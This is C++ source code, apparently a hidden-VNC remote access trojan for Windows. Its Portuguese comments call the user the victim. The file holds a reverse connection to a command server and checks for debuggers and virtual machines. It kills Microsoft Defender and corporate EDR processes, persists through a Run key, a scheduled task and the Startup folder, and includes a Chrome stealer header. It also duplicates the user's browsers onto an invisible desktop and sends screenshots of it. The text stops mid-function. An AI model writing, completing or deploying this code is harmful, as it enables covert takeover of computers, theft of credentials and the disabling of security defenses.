#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <objidl.h>
#include <shlobj.h>
#include <shellapi.h>
#include <gdiplus.h>
#include <thread>
#include <vector>
#include <psapi.h>
#include <fstream>
#include <iostream>
#include <sstream>
#include <TlHelp32.h>
#include <mutex>
#include "crypt.h"
#include "chromestealer.h"
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shell32.lib")
#define C2_IP "127.0.0.1"
#define C2_PORT 4444
#define SCREEN_CHUNK_SIZE 49152
#define RAT_MUTEX "hvnc-russian-predator"
#define IMAGE_QUALITY 85
bool keepAlive = true;
SOCKET gSock;
HWND hDeskWnd = NULL;
HDESK hGhostDesk = NULL;
std::string ghostDeskName = "hiddenvnc";
std::vector<DWORD> ghostProcs;
// CORREÇÃO CRÍTICA: Mutex para sincronizar acesso ao socket entre threads
std::mutex socketMutex;

// CORREÇÃO CRÍTICA: Sincronização entre criação e captura do desktop
HANDLE hDesktopReadyEvent = NULL;
HANDLE hCaptureReadyEvent = NULL;
bool isGhostDesktopReady = false;
ULONG_PTR gdiplusToken = 0;  // CORREÇÃO CRÍTICA: Token GDI+ global

bool IsDebuggerPresentCustom() {
    if(IsDebuggerPresent()) return true;
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    if(Process32First(h, &pe)) {
        do {
            // CORREÇÃO: Converter WCHAR para char
            char exeFile[MAX_PATH];
            wcstombs(exeFile, pe.szExeFile, MAX_PATH);
            if(strstr(exeFile, "olly") || strstr(exeFile, "ida") 
            || strstr(exeFile, "x64dbg") || strstr(exeFile, "wireshark"))
                { CloseHandle(h); return true; }
        } while(Process32Next(h, &pe));
    }
    CloseHandle(h);
    return false;
}
bool IsVM() {
    DWORD sz=256; char val[256]="";
    if(RegGetValueA(HKEY_LOCAL_MACHINE, 
        "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum", "0", 
        RRF_RT_ANY, 0, val, &sz)==ERROR_SUCCESS) 
        if(strstr(val,"VBOX")||strstr(val,"VMware")) return true;
    return false;
}
void KillDefenders() {
    // Tenta finalizar Defender (MsMpEng) e desativar proteção via PowerShell e serviço
    system("taskkill /F /IM MsMpEng.exe >nul 2>&1");
    system("powershell Set-MpPreference -DisableRealtimeMonitoring $true >nul 2>&1");
    system("net stop wdfilter >nul 2>&1");
}
void AntiEDR_Block() {
    // Mata processos comuns de EDR/AV corporativos
    const char* antiv[] = {
        "SentinelAgent.exe","cyserve.exe","Sophos.exe","crowdstrike.exe","CarbonBlack.exe"
    };
    for(int i=0;i<sizeof(antiv)/sizeof(antiv[0]);i++) {
        std::string cmd = "taskkill /F /IM ";
        cmd += antiv[i];
        cmd += " >nul 2>&1";
        system(cmd.c_str());
    }
}
void SetMutex() {
    HANDLE hMutex = CreateMutexA(NULL, TRUE, RAT_MUTEX);
    if(GetLastError() == ERROR_ALREADY_EXISTS)
        ExitProcess(0); // Só permite 1 instância
}
void TryPersist() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    HKEY key;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &key);
    RegSetValueExA(key, "hvncservice", 0, REG_SZ, (BYTE*)path, strlen(path));
    RegCloseKey(key);
    // Task Scheduler shadow
    std::ostringstream tsCmd;
    tsCmd << "schtasks /create /f /sc ONLOGON /tn \"UpdateService\" /tr \"" << path << "\"";
    system(tsCmd.str().c_str());
    // Startup folder + shadow backup
    char startup[MAX_PATH];
    SHGetSpecialFolderPathA(0, startup, CSIDL_STARTUP, 0);
    std::string startupPath = std::string(startup) + "\\hvncupdate.exe";
    if (CopyFileA(path, startupPath.c_str(), FALSE)) {
        std::ofstream shadow("C:\\ProgramData\\hvnc_shadow.log", std::ios::app);
        shadow << "Drop @" << startupPath << " [" << time(0) << "]\n"; shadow.close();
    }
}
std::string GenSessionToken() {
    std::ostringstream oss; oss << "HVNC-" << rand() << "-" << GetTickCount();
    return oss.str();
}
void ConnectReverse(SOCKET &sock, const std::string& sessionToken) {
    sockaddr_in server; server.sin_family = AF_INET;
    server.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &server.sin_addr);
    
    // Log de início da tentativa de conexão
    std::ofstream start_log("C:\\ProgramData\\hvnc_connection_start.log", std::ios::app);
    start_log << "Starting connection attempt to " << C2_IP << ":" << C2_PORT << " with token: " << sessionToken << " [" << time(0) << "]\n";
    start_log.close();
    
    int attempt = 0;
    while (true) {
        attempt++;
        
        // Log de cada tentativa
        std::ofstream attempt_log("C:\\ProgramData\\hvnc_connection_attempts.log", std::ios::app);
        attempt_log << "Connection attempt #" << attempt << " to " << C2_IP << ":" << C2_PORT << " [" << time(0) << "]\n";
        attempt_log.close();
        
        int result = connect(sock, (sockaddr*)&server, sizeof(server));
        if(result == 0){
            // CORREÇÃO CRÍTICA: Protocolo correto para envio do token
            // Primeiro envia o tamanho do token (4 bytes little-endian)
            uint32_t tokenSize = static_cast<uint32_t>(sessionToken.length());
            int sendResult1 = send(sock, reinterpret_cast<const char*>(&tokenSize), sizeof(tokenSize), 0);
            
            // Depois envia o token
            int sendResult2 = send(sock, sessionToken.c_str(), sessionToken.length(), 0);
            
            // Log da conexão estabelecida
            std::ofstream conn_log("C:\\ProgramData\\hvnc_connection_established.log", std::ios::app);
            conn_log << "Connected to server and sent token: " << sessionToken 
                     << " SendSize: " << sendResult1 << " SendToken: " << sendResult2 
                     << " [" << time(0) << "]\n";
            conn_log.close();
            
            // CORREÇÃO CRÍTICA: Conexão estabelecida, continua para main()
            std::ofstream continue_log("C:\\ProgramData\\hvnc_continue_to_main.log", std::ios::app);
            continue_log << "Connection successful, continuing to main() [" << time(0) << "]\n";
            continue_log.close();
            return; // Retorna para main() continuar
        } else {
            // Log de erro de conexão
            int error = WSAGetLastError();
            std::ofstream error_log("C:\\ProgramData\\hvnc_connection_error.log", std::ios::app);
            error_log << "Connection failed attempt #" << attempt << " Error: " << error 
                     << " to " << C2_IP << ":" << C2_PORT << " [" << time(0) << "]\n";
            error_log.close();
        }
        Sleep(2500);
    }
}
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if(size == 0) {
        std::ofstream error_log("C:\\ProgramData\\hvnc_encoder_size_error.log", std::ios::app);
        error_log << "No encoders found [" << time(0) << "]\n";
        error_log.close();
        return -1;
    }
    
    Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if(pImageCodecInfo == NULL) {
        std::ofstream error_log("C:\\ProgramData\\hvnc_encoder_malloc_error.log", std::ios::app);
        error_log << "Malloc failed for encoder info [" << time(0) << "]\n";
        error_log.close();
        return -1;
    }
    
    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
    for(UINT j = 0; j < num; ++j) {
        if(wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    
    std::ofstream error_log("C:\\ProgramData\\hvnc_encoder_notfound_error.log", std::ios::app);
    error_log << "JPEG encoder not found [" << time(0) << "]\n";
    error_log.close();
    
    free(pImageCodecInfo);
    return -1;
}

// *** ESTRUTURA PARA CAPTURA DE JANELAS DO DESKTOP FANTASMA *** //
struct WindowCaptureData {
    HDC hdcTarget;
    int offsetX;
    int offsetY;
    std::vector<HWND> windows;
};

// Callback para enumerar janelas do desktop fantasma
BOOL CALLBACK EnumGhostWindowsProc(HWND hwnd, LPARAM lParam) {
    WindowCaptureData* data = (WindowCaptureData*)lParam;
    
    // Verifica se a janela é visível e tem área
    if (IsWindowVisible(hwnd)) {
        RECT rect;
        if (GetWindowRect(hwnd, &rect) && 
            (rect.right - rect.left > 0) && (rect.bottom - rect.top > 0)) {
            data->windows.push_back(hwnd);
        }
    }
    return TRUE;
}

// *** FUNÇÃO AUXILIAR PARA SALVAR DEBUG DE CAPTURAS *** //
void SaveDebugCapture(HDC hMemDC, int width, int height, const std::string& filename) {
    HBITMAP hBitmap = (HBITMAP)GetCurrentObject(hMemDC, OBJ_BITMAP);
    if (!hBitmap) return;
    
    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);
    
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;
    
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height; // Top-down DIB
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;
    
    DWORD dwBmpSize = ((width * bi.biBitCount + 31) / 32) * 4 * height;
    
    bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfType = 0x4D42; // "BM"
    
    HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
    char* lpbitmap = (char*)GlobalLock(hDIB);
    
    GetDIBits(hMemDC, hBitmap, 0, (UINT)height, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    
    HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD dwBytesWritten = 0;
        WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
        WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
        WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);
        CloseHandle(hFile);
        
        std::ofstream debug_log("C:\\ProgramData\\hvnc_debug_save.log", std::ios::app);
        debug_log << "Debug capture saved: " << filename << " [" << time(0) << "]\n";
        debug_log.close();
    }
    
    GlobalUnlock(hDIB);
    GlobalFree(hDIB);
}

// *** HVNC REAL: CAPTURA EXCLUSIVA DO DESKTOP FANTASMA *** //
std::vector<BYTE> CaptureGhostDesktopJPEG(HDESK hGhostDesk, int w, int h, int quality=IMAGE_QUALITY) {
    std::vector<BYTE> out;
    
    // HVNC REAL: Captura APENAS do desktop fantasma invisível
    // NUNCA captura o desktop principal da vítima
    
    bool captureSuccess = false;
    HDC hdcMem = NULL;
    HBITMAP hBitmap = NULL;
    HBITMAP hOldBitmap = NULL;
    
    // Log de início da captura HVNC real
    std::ofstream debug_log("C:\\ProgramData\\hvnc_ghost_capture.log", std::ios::app);
    debug_log << "HVNC REAL: Capturando APENAS desktop fantasma invisível [" << time(0) << "]\n";
    debug_log.close();
    
    // HVNC REAL: Criar canvas para composição das janelas do desktop fantasma
    HDC hdcScreen = GetDC(NULL);
    if (hdcScreen) {
        hdcMem = CreateCompatibleDC(hdcScreen);
        hBitmap = CreateCompatibleBitmap(hdcScreen, w, h);
        hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);
        ReleaseDC(NULL, hdcScreen);
        
        // HVNC REAL: Limpar canvas com cor de fundo do desktop fantasma
        RECT canvasRect = {0, 0, w, h};
        HBRUSH hBackgroundBrush = CreateSolidBrush(RGB(0, 120, 215)); // Cor Windows
        FillRect(hdcMem, &canvasRect, hBackgroundBrush);
        DeleteObject(hBackgroundBrush);
        
        std::ofstream canvas_log("C:\\ProgramData\\hvnc_canvas_created.log", std::ios::app);
        canvas_log << "HVNC: Canvas criado para desktop fantasma [" << time(0) << "]\n";
        canvas_log.close();
    }
    
    // HVNC REAL: Capturar APENAS janelas do desktop fantasma usando EnumDesktopWindows + PrintWindow
    if (hdcMem && hGhostDesk) {
        std::ofstream ghost_log("C:\\ProgramData\\hvnc_ghost_enum.log", std::ios::app);
        ghost_log << "HVNC REAL: Enumerando janelas do desktop fantasma: " << ghostDeskName << " [" << time(0) << "]\n";
        ghost_log.close();
        
        // HVNC REAL: Estrutura para capturar janelas do desktop fantasma
        WindowCaptureData ghostCaptureData;
        ghostCaptureData.hdcTarget = hdcMem;
        ghostCaptureData.offsetX = 0;
        ghostCaptureData.offsetY = 0;
        ghostCaptureData.windows.clear();
        
        // HVNC REAL: Enumerar APENAS janelas do desktop fantasma (invisível)
        BOOL enumResult = EnumDesktopWindows(hGhostDesk, EnumGhostWindowsProc, (LPARAM)&ghostCaptureData);
        
        std::ofstream enum_log("C:\\ProgramData\\hvnc_enum_result.log", std::ios::app);
        enum_log << "HVNC REAL: EnumDesktopWindows resultado: " << (enumResult ? "SUCCESS" : "FAILED")
                 << " Janelas fantasma encontradas: " << ghostCaptureData.windows.size()
                 << " Desktop fantasma: " << ghostDeskName
                 << " [" << time(0) << "]\n";
        enum_log.close();
        
        // HVNC REAL: Capturar cada janela do desktop fantasma individualmente
        int capturedGhostWindows = 0;
        for (HWND ghostHwnd : ghostCaptureData.windows) {
            RECT ghostRect;
            if (GetWindowRect(ghostHwnd, &ghostRect)) {
                int ghostWinW = ghostRect.right - ghostRect.left;
                int ghostWinH = ghostRect.bottom - ghostRect.top;
                
                // HVNC REAL: Validar janela do desktop fantasma
                if (ghostRect.left < w && ghostRect.top < h && ghostWinW > 0 && ghostWinH > 0) {
                    HDC hdcTemp = GetDC(NULL);
                    HDC hdcGhostWindow = CreateCompatibleDC(hdcTemp);
                    HBITMAP hGhostWinBitmap = CreateCompatibleBitmap(hdcTemp, ghostWinW, ghostWinH);
                    ReleaseDC(NULL, hdcTemp);
                    HBITMAP hOldGhostWinBitmap = (HBITMAP)SelectObject(hdcGhostWindow, hGhostWinBitmap);
                    
                    // HVNC REAL: Capturar janela do desktop fantasma com PrintWindow
                    if (PrintWindow(ghostHwnd, hdcGhostWindow, PW_CLIENTONLY | PW_RENDERFULLCONTENT)) {
                        // HVNC REAL: Compor janela fantasma no canvas final
                        BitBlt(hdcMem, ghostRect.left, ghostRect.top, ghostWinW, ghostWinH, hdcGhostWindow, 0, 0, SRCCOPY);
                        capturedGhostWindows++;
                        
                        std::ofstream window_log("C:\\ProgramData\\hvnc_ghost_window.log", std::ios::app);
                        window_log << "HVNC: Janela fantasma capturada - HWND: " << ghostHwnd
                                  << " Pos: (" << ghostRect.left << "," << ghostRect.top << ")"
                                  << " Tamanho: " << ghostWinW << "x" << ghostWinH
                                  << " [" << time(0) << "]\n";
                        window_log.close();
                    }
                    
                    SelectObject(hdcGhostWindow, hOldGhostWinBitmap);
                    DeleteObject(hGhostWinBitmap);
                    DeleteDC(hdcGhostWindow);
                }
            }
        }
        
        // HVNC REAL: Sucesso se capturou janelas do desktop fantasma (ou desktop vazio)
        captureSuccess = true; // Sempre sucesso para mostrar desktop fantasma (mesmo vazio)
        
        std::ofstream ghost_result_log("C:\\ProgramData\\hvnc_ghost_result.log", std::ios::app);
        ghost_result_log << "HVNC REAL: Captura desktop fantasma SUCESSO" 
                        << " - Janelas fantasma capturadas: " << capturedGhostWindows 
                        << " de " << ghostCaptureData.windows.size() << " encontradas"
                        << " Desktop fantasma: " << ghostDeskName
                        << " Vítima NÃO vê nada (invisível)"
                        << " [" << time(0) << "]\n";
        ghost_result_log.close();
    }
    
    // MÉTRICAS DE PERFORMANCE - Início da conversão JPEG
    DWORD jpegStartTime = GetTickCount();
    
    // CORREÇÃO CRÍTICA: Validar bitmap antes da conversão GDI+
    BITMAP bmpInfo;
    if (!GetObject(hBitmap, sizeof(BITMAP), &bmpInfo)) {
        std::ofstream error_log("C:\\ProgramData\\hvnc_bitmap_invalid.log", std::ios::app);
        error_log << "ERRO: Bitmap inválido para conversão JPEG [" << time(0) << "]\n";
        error_log.close();
        SelectObject(hdcMem, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        // hdcScreen já foi liberado
        return out;
    }
    
    // CORREÇÃO CRÍTICA: Criar bitmap GDI+ com validação
    Gdiplus::Bitmap* gdipBitmap = nullptr;
    try {
        gdipBitmap = new Gdiplus::Bitmap(hBitmap, NULL);
        if (!gdipBitmap || gdipBitmap->GetLastStatus() != Gdiplus::Ok) {
            std::ofstream error_log("C:\\ProgramData\\hvnc_gdiplus_bitmap_error.log", std::ios::app);
            error_log << "ERRO: Falha ao criar Gdiplus::Bitmap - Status: " << (gdipBitmap ? gdipBitmap->GetLastStatus() : -1) << " [" << time(0) << "]\n";
            error_log.close();
            if (gdipBitmap) delete gdipBitmap;
            SelectObject(hdcMem, hOldBitmap);
            DeleteObject(hBitmap);
            DeleteDC(hdcMem);
            // hdcScreen já foi liberado
            return out;
        }
    } catch (...) {
        // Tratamento de exceção para GDI+
        if (gdipBitmap) delete gdipBitmap;
        SelectObject(hdcMem, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        // hdcScreen já foi liberado
        return out;
    }
    
    CLSID jpgClsid;
    if (GetEncoderClsid(L"image/jpeg", &jpgClsid) == -1) {
        std::ofstream error_log("C:\\ProgramData\\hvnc_encoder_error.log", std::ios::app);
        error_log << "JPEG encoder not found [" << time(0) << "]\n";
        error_log.close();
        delete gdipBitmap;
        SelectObject(hdcMem, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        // hdcScreen já foi liberado
        return out;
    }
    
    // CORREÇÃO CRÍTICA: Configurar parâmetros de qualidade JPEG com validação
    Gdiplus::EncoderParameters* pEncoderParams = nullptr;
    ULONG qualityValue = (ULONG)quality;
    
    // Valida qualidade JPEG (1-100)
    if (qualityValue < 1) qualityValue = 1;
    if (qualityValue > 100) qualityValue = 100;
    
    // Aloca parâmetros do encoder corretamente
    pEncoderParams = (Gdiplus::EncoderParameters*)malloc(sizeof(Gdiplus::EncoderParameters));
    if (!pEncoderParams) {
        std::ofstream error_log("C:\\ProgramData\\hvnc_encoder_params_malloc_error.log", std::ios::app);
        error_log << "Falha ao alocar EncoderParameters [" << time(0) << "]\n";
        error_log.close();
        delete gdipBitmap;
        SelectObject(hdcMem, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        // hdcScreen já foi liberado
        return out;
    }
    
    pEncoderParams->Count = 1;
    pEncoderParams->Parameter[0].Guid = Gdiplus::EncoderQuality;
    pEncoderParams->Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    pEncoderParams->Parameter[0].NumberOfValues = 1;
    pEncoderParams->Parameter[0].Value = &qualityValue;
    
    // CORREÇÃO CRÍTICA: Criar stream com validação
    IStream* stream = nullptr;
    HRESULT streamResult = CreateStreamOnHGlobal(NULL, TRUE, &stream);
    if (FAILED(streamResult) || !stream) {
        std::ofstream error_log("C:\\ProgramData\\hvnc_stream_creation_error.log", std::ios::app);
        error_log << "ERRO: Falha ao criar IStream - HRESULT: " << streamResult << " [" << time(0) << "]\n";
        error_log.close();
        delete gdipBitmap;
        SelectObject(hdcMem, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        // Recursos já foram liberados
        return out;
    }
    
    // CORREÇÃO CRÍTICA: Salvar com validação de status usando parâmetros alocados
    Gdiplus::Status saveResult = gdipBitmap->Save(stream, &jpgClsid, pEncoderParams);
    
    if (saveResult == Gdiplus::Ok) {
        // CORREÇÃO CRÍTICA: Resetar ponteiro do stream para o início
        LARGE_INTEGER liZero = {0};
        stream->Seek(liZero, STREAM_SEEK_SET, NULL);
        
        STATSTG stg; stream->Stat(&stg,STATFLAG_NONAME);
        DWORD sz=stg.cbSize.LowPart;
        out.resize(sz);
        ULONG readed;
        stream->Read(out.data(), sz, &readed);
        
        // MÉTRICAS DE QUALIDADE E PERFORMANCE
        DWORD jpegEndTime = GetTickCount();
        DWORD conversionTime = jpegEndTime - jpegStartTime;
        
        // Verificar assinatura JPEG válida
        bool validJpeg = (sz >= 4 && out[0] == 0xFF && out[1] == 0xD8 && 
                         out[sz-2] == 0xFF && out[sz-1] == 0xD9);
        
        // HVNC REAL: Log detalhado de qualidade e performance do desktop fantasma
        std::ofstream quality_log("C:\\ProgramData\\hvnc_ghost_jpeg_quality.log", std::ios::app);
        quality_log << "HVNC REAL: JPEG DESKTOP FANTASMA " << (validJpeg ? "VÁLIDO" : "INVÁLIDO") 
                   << " - Tamanho: " << sz << " bytes"
                   << " - Qualidade: " << quality << "%"
                   << " - Tempo conversão: " << conversionTime << "ms"
                   << " - Método: EnumDesktopWindows + PrintWindow (HVNC REAL)"
                   << " - Resolução: " << w << "x" << h
                   << " - Desktop fantasma: " << ghostDeskName
                   << " - Vítima NÃO vê nada (invisível)"
                   << " [" << time(0) << "]\n";
        quality_log.close();
        
        // HVNC REAL: Salvar JPEG de debug do desktop fantasma se inválido
        if (!validJpeg) {
            char jpegDebugFile[256];
            sprintf(jpegDebugFile, "C:\\ProgramData\\hvnc_ghost_invalid_jpeg_%ld.jpg", time(0));
            std::ofstream jpegFile(jpegDebugFile, std::ios::binary);
            jpegFile.write((char*)out.data(), sz);
            jpegFile.close();
            
            std::ofstream invalid_log("C:\\ProgramData\\hvnc_ghost_invalid_jpeg.log", std::ios::app);
            invalid_log << "HVNC REAL: JPEG desktop fantasma INVÁLIDO salvo: " << jpegDebugFile
                       << " Desktop fantasma: " << ghostDeskName << " [" << time(0) << "]\n";
            invalid_log.close();
        }
    } else {
        // HVNC REAL: Log detalhado de erro na conversão JPEG do desktop fantasma
        std::ofstream jpeg_error_log("C:\\ProgramData\\hvnc_ghost_jpeg_error.log", std::ios::app);
        jpeg_error_log << "HVNC REAL: ERRO na conversão JPEG DESKTOP FANTASMA - Status: " << saveResult 
                      << " - Desktop fantasma: " << ghostDeskName 
                      << " - Bitmap válido: " << (gdipBitmap ? "Sim" : "Não")
                      << " - Dimensões: " << w << "x" << h
                      << " - Qualidade: " << quality << "%"
                      << " - Vítima NÃO vê nada (desktop fantasma invisível)"
                      << " [" << time(0) << "]\n";
        jpeg_error_log.close();
    }
    
    // CORREÇÃO CRÍTICA: Limpeza adequada de recursos incluindo parâmetros do encoder
    if (pEncoderParams) {
        free(pEncoderParams);
        pEncoderParams = nullptr;
    }
    if (stream) {
        stream->Release();
        stream = nullptr;
    }
    if (gdipBitmap) {
        delete gdipBitmap;
        gdipBitmap = nullptr;
    }

    // CORREÇÃO CRÍTICA: Limpeza adequada de recursos
    SelectObject(hdcMem, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    // Recursos já foram liberados

    return out;
}

// ESTRUTURA PARA ARMAZENAR INFORMAÇÕES DE JANELAS DA SESSÃO ATUAL
struct CurrentSessionWindow {
    HWND hwnd;
    std::string windowTitle;
    std::string processName;
    std::string processPath;
    RECT windowRect;
    bool isVisible;
    DWORD processId;
};

std::vector<CurrentSessionWindow> currentSessionWindows;

// CALLBACK PARA ENUMERAR JANELAS DA SESSÃO ATUAL
BOOL CALLBACK EnumCurrentSessionWindows(HWND hwnd, LPARAM lParam) {
    if (!IsWindowVisible(hwnd)) return TRUE;
    
    char windowTitle[256] = {0};
    GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
    
    // Ignora janelas sem título ou do sistema
    if (strlen(windowTitle) == 0) return TRUE;
    if (strstr(windowTitle, "Program Manager") || 
        strstr(windowTitle, "Task Switching") ||
        strstr(windowTitle, "Desktop Window Manager")) return TRUE;
    
    DWORD processId;
    GetWindowThreadProcessId(hwnd, &processId);
    
    // Obtém informações do processo
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (hProcess) {
        char processPath[MAX_PATH] = {0};
        DWORD pathSize = MAX_PATH;
        QueryFullProcessImageNameA(hProcess, 0, processPath, &pathSize);
        
        CurrentSessionWindow window;
        window.hwnd = hwnd;
        window.windowTitle = windowTitle;
        window.processPath = processPath;
        window.processId = processId;
        window.isVisible = IsWindowVisible(hwnd);
        GetWindowRect(hwnd, &window.windowRect);
        
        // Extrai nome do processo do caminho
        std::string path = processPath;
        size_t lastSlash = path.find_last_of("\\");
        if (lastSlash != std::string::npos) {
            window.processName = path.substr(lastSlash + 1);
        }
        
        currentSessionWindows.push_back(window);
        
        std::ofstream session_log("hvnc_current_session.log", std::ios::app);
        session_log << "FOUND WINDOW: " << windowTitle << " | PROCESS: " << window.processName 
                   << " | PID: " << processId << " [" << time(0) << "]\n";
        session_log.close();
        
        CloseHandle(hProcess);
    }
    
    return TRUE;
}

// HVNC REAL: FUNÇÃO AVANÇADA PARA DUPLICAR SESSÃO COMPLETA NO DESKTOP FANTASMA
void DuplicateCurrentSessionToGhost(const std::string& ghostDesktopName) {
    std::ofstream duplication_log("C:\\ProgramData\\hvnc_session_duplication.log", std::ios::app);
    duplication_log << "HVNC REAL: INICIANDO DUPLICAÇÃO COMPLETA DA SESSÃO ATUAL [" << time(0) << "]\n";
    duplication_log.close();
    
    // HVNC REAL: Primeiro, força a criação do Explorer.exe no desktop fantasma
    STARTUPINFOA explorerSi = {0};
    PROCESS_INFORMATION explorerPi = {0};
    explorerSi.cb = sizeof(explorerSi);
    explorerSi.lpDesktop = (LPSTR)ghostDesktopName.c_str();
    explorerSi.dwFlags = STARTF_USESHOWWINDOW;
    explorerSi.wShowWindow = SW_SHOW;
    
    BOOL explorerResult = CreateProcessA(
        "C:\\Windows\\explorer.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP,
        NULL, NULL, &explorerSi, &explorerPi
    );
    
    if (explorerResult) {
        ghostProcs.push_back(explorerPi.dwProcessId);
        std::ofstream explorer_log("C:\\ProgramData\\hvnc_explorer_created.log", std::ios::app);
        explorer_log << "HVNC REAL: Explorer.exe criado no desktop fantasma - PID: " << explorerPi.dwProcessId << " [" << time(0) << "]\n";
        explorer_log.close();
        CloseHandle(explorerPi.hProcess);
        CloseHandle(explorerPi.hThread);
        Sleep(2000); // Aguarda Explorer carregar
    }
    
    // Enumera todas as janelas da sessão atual
    currentSessionWindows.clear();
    EnumWindows(EnumCurrentSessionWindows, 0);
    
    std::ofstream found_log("C:\\ProgramData\\hvnc_session_found.log", std::ios::app);
    found_log << "HVNC REAL: ENCONTRADAS " << currentSessionWindows.size() << " JANELAS NA SESSÃO ATUAL [" << time(0) << "]\n";
    found_log.close();
    
    int duplicatedApps = 0;
    
    // Duplica cada aplicação encontrada no desktop fantasma
    for (const auto& window : currentSessionWindows) {
        if (window.processPath.empty()) continue;
        
        // HVNC REAL: Filtra processos do sistema mas permite aplicações importantes
        if (window.processName == "hvnc_client.exe" ||
            window.processName == "dwm.exe" ||
            window.processName == "winlogon.exe" ||
            window.processName == "csrss.exe" ||
            window.processName == "explorer.exe" || // Já criado separadamente
            window.processName == "svchost.exe" ||
            window.processName == "lsass.exe" ||
            window.processName == "services.exe") continue;
            
        // HVNC REAL: Prioriza aplicações do usuário (browsers, editores, etc.)
        bool isPriorityApp = (window.processName.find("chrome") != std::string::npos ||
                             window.processName.find("firefox") != std::string::npos ||
                             window.processName.find("notepad") != std::string::npos ||
                             window.processName.find("calc") != std::string::npos ||
                             window.processName.find("mspaint") != std::string::npos);
        
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.lpDesktop = (LPSTR)ghostDesktopName.c_str();
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;
        
        // Tenta criar o processo no desktop fantasma
        BOOL result = CreateProcessA(
            window.processPath.c_str(),
            NULL,
            NULL, NULL, FALSE,
            CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP,
            NULL, NULL, &si, &pi
        );
        
        if (result) {
            ghostProcs.push_back(pi.dwProcessId);
            duplicatedApps++;
            
            std::ofstream success_log("C:\\ProgramData\\hvnc_duplication_success.log", std::ios::app);
            success_log << "HVNC REAL: DUPLICADO COM SUCESSO: " << window.processName << " | TÍTULO: " << window.windowTitle 
                       << " | NOVO PID: " << pi.dwProcessId << " | DESKTOP FANTASMA: " << ghostDesktopName 
                       << " | PRIORIDADE: " << (isPriorityApp ? "ALTA" : "NORMAL")
                       << " | VÍTIMA NÃO VÊ NADA [" << time(0) << "]\n";
            success_log.close();
            
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            
            // HVNC REAL: Aguarda mais tempo para aplicações prioritárias
            if (isPriorityApp) {
                Sleep(1000);
            }
        } else {
            DWORD errorCode = GetLastError();
            std::ofstream error_log("C:\\ProgramData\\hvnc_duplication_error.log", std::ios::app);
            error_log << "HVNC REAL: FALHA AO DUPLICAR: " << window.processName 
                     << " | ERRO: " << errorCode << " | CAMINHO: " << window.processPath
                     << " | DESKTOP FANTASMA: " << ghostDesktopName
                     << " [" << time(0) << "]\n";
            error_log.close();
        }
        
        Sleep(300); // Pausa entre duplicações
    }
    
    // HVNC REAL: Cria aplicações essenciais adicionais no desktop fantasma
    const char* essentialApps[] = {
        "C:\\Windows\\System32\\notepad.exe",
        "C:\\Windows\\System32\\calc.exe",
        "C:\\Windows\\System32\\mspaint.exe"
    };
    
    for (int i = 0; i < 3; i++) {
        STARTUPINFOA essentialSi = {0};
        PROCESS_INFORMATION essentialPi = {0};
